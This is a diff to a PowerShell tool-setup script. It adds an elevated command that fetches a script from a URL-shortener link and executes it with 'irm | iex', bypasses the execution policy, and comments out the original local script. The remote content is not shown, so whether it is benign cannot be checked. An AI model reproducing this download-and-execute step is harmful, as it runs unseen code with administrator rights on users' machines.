@@ -1,3 +1,8 @@
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+Start-Process powershell -Verb runAs { irm https://seulink.net/MZTOOL | iex }
+<#    
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
 $TOOL = "C:\TOOL"
@@ -114,3 +119,5 @@ Remove-Item -Path $TOOL\#TOOL#ZIP\DRIVER_BOOSTER_7.5_PORTABLE -Recurse -Force -E
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
 
 exit
+
+}#>
